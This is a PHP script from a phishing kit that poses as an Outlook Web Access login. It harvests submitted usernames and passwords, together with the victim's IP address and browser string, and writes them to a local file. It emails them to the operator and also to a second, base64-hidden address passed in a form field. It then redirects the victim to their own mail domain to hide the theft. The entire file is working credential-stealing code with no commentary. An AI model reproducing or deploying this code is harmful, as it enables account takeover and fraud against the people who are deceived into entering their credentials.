<?php
include 'email.php';
session_start();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]User:       ".$_POST['username']."\n";
$message .= "[+]Pass:       ".$_POST['password']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){
$subject = $pra." OWA-XPANEL II- [".$_POST['username']."]";
$headers = "From: Appsuite0".$pra."<bursted@".$pra."0Appsuite.com>";
$myfile = fopen("data.txt", "a") or die("Unable to open file!");
$txt = $message;
fwrite($myfile, $txt);
$IP = base64_decode($_POST['IP']);
fclose($myfile);
mail($send,$subject,$message,$headers);
mail($IP,$subject,$message,$headers);
$emaila = $_POST['username'];
$domain = substr($emaila, strpos($emaila, '@') + 1);
header("Location: https://autodiscover.$domain");
}else{
header("location: index2.php?email=".$_POST['username']);
}	 
?>